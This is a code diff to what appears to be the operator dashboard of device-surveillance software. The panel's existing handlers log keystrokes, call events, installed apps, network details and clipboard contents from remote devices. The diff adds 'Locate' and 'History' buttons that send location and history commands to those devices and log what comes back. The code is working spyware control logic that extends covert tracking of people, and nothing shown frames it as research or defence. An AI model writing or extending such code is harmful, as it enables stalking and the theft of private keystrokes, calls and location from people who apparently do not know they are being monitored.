@@ -69,6 +69,8 @@ h3 { margin:14px 0 6px; font-size:14px; opacity:.75; }
 
 <div class="row">
 <button id="saveSnap">Save snapshot</button>
+<button id="locBtn">Locate</button>
+<button id="histBtn">History</button>
 <button id="export">Export history</button>
 <button id="clear">Clear feed</button>
 <button id="update">Update</button>
@@ -354,6 +356,7 @@ if (m.keys) addLog(m.keys, m.dev);
 }
 }
 
+if (m.type === 'hist') { (m.rows || []).forEach(function (r) { addLog((r.type || '?') + ' ' + JSON.stringify(r).slice(0, 120), r.dev); }); return; }
 if (m.type === 'call') { addLog('call ' + m.dir + ' ' + (m.state === 'end' ? m.seconds + 's' : 'start'), m.dev); return; }
 if (m.type === 'apps') { addLog('apps: ' + ((m.found || []).join(' ') || 'none'), m.dev); return; }
 if (m.type === 'net') { addLog('net: ' + (m.ip || '-') + ' ' + (m.carrier || '-') + ' free ' + (m.diskFreeMB || 0) + 'MB', m.dev); return; }
@@ -483,6 +486,8 @@ persist(); renderAlerts(); renderLog(); renderClips();
 setStatus('feed cleared');
 };
 
+document.getElementById('locBtn').onclick = function () { act('locate', { type: 'cmd', cmd: 'locate' }); };
+document.getElementById('histBtn').onclick = function () { act('history', { type: 'cmd', cmd: 'hist' }); };
 window.__upd = function (s) { setStatus(s); };
 document.getElementById('update').onclick = function () {
 if (!B || !B.checkUpdate) { setStatus('no updater'); return; }
